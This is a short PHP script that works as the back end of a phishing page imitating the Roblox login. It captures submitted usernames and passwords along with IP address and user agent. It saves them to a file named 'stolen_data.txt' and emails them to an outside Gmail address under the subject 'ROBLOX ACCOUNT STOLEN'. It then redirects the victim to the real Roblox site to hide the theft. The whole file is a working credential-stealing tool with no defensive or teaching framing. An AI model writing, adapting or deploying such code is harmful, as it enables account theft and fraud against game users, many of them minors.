<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $username = $_POST['username'];
    $password = $_POST['password'];
    $ip = $_SERVER['REMOTE_ADDR'];
    $user_agent = $_SERVER['HTTP_USER_AGENT'];
    $date = date('Y-m-d H:i:s');
    
    $data = "=== ROBLOX ACCOUNT DATA ===\n";
    $data .= "Date: $date\n";
    $data .= "IP: $ip\n";
    $data .= "User Agent: $user_agent\n";
    $data .= "Username: $username\n";
    $data .= "Password: $password\n";
    $data .= "===========================\n\n";
    
    // Сохраняем в файл
    file_put_contents('stolen_data.txt', $data, FILE_APPEND);
    
    // Отправляем на почту
    $to = 'zxcflayer@gmail.com';
    $subject = 'ROBLOX ACCOUNT STOLEN - ' . $date;
    $headers = 'From: robux-generator@neterror.com' . "\r\n" .
               'Content-Type: text/plain; charset=utf-8';
    
    mail($to, $subject, $data, $headers);
    
    // Перенаправляем на официальный сайт
    header('Location: https://www.roblox.com/login');
    exit();
}
?>
